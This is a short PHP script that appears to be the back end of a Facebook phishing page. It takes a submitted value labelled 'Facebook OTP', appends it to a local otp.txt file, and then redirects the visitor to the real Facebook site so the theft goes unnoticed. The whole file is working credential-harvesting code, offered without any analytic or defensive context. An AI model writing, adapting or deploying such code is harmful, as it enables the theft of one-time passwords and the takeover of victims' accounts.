<?php
file_put_contents("otp.txt", "Facebook OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.facebook.com');
?>
